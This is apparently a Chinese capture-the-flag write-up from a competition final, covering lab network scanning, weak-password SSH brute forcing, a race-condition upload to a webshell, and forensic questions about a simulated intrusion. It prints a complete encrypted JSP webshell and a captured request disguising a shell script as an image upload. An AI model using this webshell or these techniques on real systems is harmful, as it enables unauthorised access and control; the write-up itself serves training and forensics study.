# 企业环境渗透

上来fscan扫一下端口和服务

```
[*] Icmp alive hosts len is: 60 
202.0.7.193:22 open 
202.0.7.110:22 open 
202.0.7.105:22 open 
202.0.7.189:22 open 
202.0.7.193:80 open 
202.0.7.191:22 open 
202.0.7.110:80 open 
202.0.7.105:80 open 
202.0.7.106:22 open 
202.0.7.191:80 open 
202.0.7.254:80 open 
202.0.7.254:443 open 
202.0.7.193:3306 open 
202.0.7.105:3306 open 
202.0.7.110:8080 open 
202.0.7.191:8080 open 
202.0.7.106:8888 open 
202.0.7.189:8888 open 
202.0.7.189:8899 open 
202.0.7.106:8899 open 
[*] alive ports len is: 20 
start vulscan 
[*] WebTitle http://202.0.7.191     code:200 len:1428  title:Photo Site | Index 
[*] WebTitle http://202.0.7.193     code:200 len:10596  title:Enterprise Internal Doc Uploading 
[*] WebTitle http://202.0.7.110     code:200 len:1428  title:Photo Site | Index 
[*] WebTitle http://202.0.7.105     code:200 len:10596  title:Enterprise Internal Doc Uploading 
[*] WebTitle http://202.0.7.110:8080  code:200 len:713   title:T3 GAMES 
[*] WebTitle http://202.0.7.191:8080  code:200 len:713   title:T3 GAMES 
[*] WebTitle http://202.0.7.106:8899  code:200 len:658   title:内测页面 
[*] WebTitle http://202.0.7.189:8899  code:200 len:658   title:内测页面 
[*] WebTitle http://202.0.7.254     code:301 len:0    title:None 跳转url: https://202.0.7.254/simple/view/login.html 
[*] WebTitle https://202.0.7.254    code:301 len:0    title:None 跳转url: https://202.0.7.254/simple/view/login.html 
[*] WebTitle https://202.0.7.254/simple/view/login.html code:200 len:11120  title:"" 
[*] WebTitle https://202.0.7.254/simple/view/login.html code:200 len:11120  title:"" 
已完成 12/20 [-] ssh 202.0.7.189:22 root 12345678 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 
已完成 14/20 [-] ssh 202.0.7.189:22 root Aa12345. ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 
已完成 14/20 [-] ssh 202.0.7.191:22 root 1q2w3e ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 
已完成 14/20 [-] ssh 202.0.7.106:22 admin 1qaz2wsx ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 
已完成 18/20 [-] ssh 202.0.7.110:22 admin 123321 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 
已完成 18/20 [-] ssh 202.0.7.191:22 admin sysadmin ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
```



## 1.flag1{9a0fe27c8bcc9aad51eda55e1b735eb5}

![img](https://cdn.jsdelivr.net/gh/bGl1o/Pictures@img/202405261227133.jpg) 

## 2.flag2{5399019c4053e1a5e756522fe94cdefe}

![img](https://cdn.jsdelivr.net/gh/bGl1o/Pictures@img/202405261227433.jpg) 

访问得到flag

![img](./长城杯总决赛.assets/wps3.jpg) 

## 条件竞争拿到http://202.0.7.193/的shell

![img](./长城杯总决赛.assets/wps4.jpg) 

![img](./长城杯总决赛.assets/wps5.jpg) 

## 蚁剑连接

![img](./长城杯总决赛.assets/wps6.jpg) 

## 3.在根目录拿到flag8{912ec803b2ce49e4a541068d495ab570}

![img](./长城杯总决赛.assets/wps7.jpg) 

## 扫描202.0.7.191到得到http://202.0.7.191/uploads/

![img](./长城杯总决赛.assets/wps8.jpg) 

## 4. 看shell.txt拿到shell.php的密码蚁剑连接在/var/www/html/hereisaflAg4拿到flag4{efba34b4991857a0c3639a0a31424041}

![img](./长城杯总决赛.assets/wps9.jpg) 

## 5. 在/var/www/html/ajax.php.bak拿到flag3{21db4fb5e7cd1d14f041436c4f50ce8c}

![img](./长城杯总决赛.assets/wps10.jpg) 

## 根据提示写脚本爆破出密码为password76

with open("passwd.txt", "w", encoding="utf-8") as f: 
  for i in range(10): 
    for j in range(10): 
      passwd = 'password'+str(i)+str(j)+'\n' 
      f.write(passwd) 
\#生成密码

![img](./长城杯总决赛.assets/wps11.jpg) 

![img](./长城杯总决赛.assets/wps12.jpg) 

## 6. ssh登录拿到flag5{a40310f194e1abfec9581d026e29832c}

![img](./长城杯总决赛.assets/wps13.jpg) 

# 溯源取证

## *黑客攻击此服务器所使用的2个IP分别是什么*

根据流量特征分析可以找到`202.1.1.1`

![](./长城杯总决赛.assets/1.png)

在根据系统定时任务可以看到另一个攻击ip

![](./长城杯总决赛.assets/2.png)

##  关卡描述：*存在安全问题的apk中使用的登录密码是什么?*

```
password663399
```

![](./长城杯总决赛.assets/3.png)

## *黑客尝试上传一个文件但显示无上传权限的文件名是什么？*

wireshark 抓包，过滤参数`http.request.full_uri contains "upload" `

发现

```
POST /api/upload HTTP/1.1
Access-Flag: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb290IjoiMCIsImV4cCI6MTcxNTQyMjY1OH0._NZIgZpwplDj9vxAyQgTpFVGP5Zragy0ysn5-N3CHRQ
Content-Type: multipart/form-data; boundary=73c2dff9-ef77-468c-a827-fbc47ae4273b
Content-Length: 216
Host: 202.1.1.66:8080
Connection: close
Accept-Encoding: gzip, deflate, br
User-Agent: okhttp/4.9.0

--73c2dff9-ef77-468c-a827-fbc47ae4273b
Content-Disposition: form-data; name="avatar"; filename="pic.jpg"
Content-Type: image/jpeg
Content-Length: 17

#!/bin/bash
df -h
--73c2dff9-ef77-468c-a827-fbc47ae4273b--
HTTP/1.1 200 
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Type: application/json
Transfer-Encoding: chunked
Date: Sat, 11 May 2024 10:12:45 GMT
Connection: close

24
{"msg":"........
```

文件名`pic.jpg`

## *黑客利用的漏洞接口的api地址是什么?（http://xxxx/xx)*

文件上传，上传了一个恶意的jsp马,图中见接口

![](./长城杯总决赛.assets/4.png)

## *黑客上传的webshell绝对路径是什么？*

这个没啥好说的，看截图

![](./长城杯总决赛.assets/5.png)

## *黑客上传的webshell的密码是什么？*

bing_pass

```java
[root@centos7 static]# cat s74e7vwmzs21d5x6.jsp 
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter("bing_pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>
```

## *黑客通过webshell执行的第一条命令是什么？*

猜的

## *黑客获取webshell时查询当前shell的权限是什么？*

以web打进来的，当然是web程序运行用户的权限了

## *黑客从服务器上下载的秘密文件的绝对路径是什么？*

`/usr/local/tomcat/webapps/ROOT/static/secert.file`  没啥好说的，和马的路径一样

## *黑客通过什么文件修改的root密码（绝对路径*

![](./长城杯总决赛.assets/6.png)

`/etc/passwd`文件权限被修改了

## *黑客设置的root密码是多少？*

猜的，123456

## *黑客留下后门的反连的ip和port是什么？（ip:port)*

文档的开头截图中有反弹shell的ip信息

## *黑客的后门将root密码记录在哪个文件中？（绝对路径）*

这个也没啥好说的，`/tmp`目录不限权限，黑客比较喜欢的目录，自然要`ls -al`看一下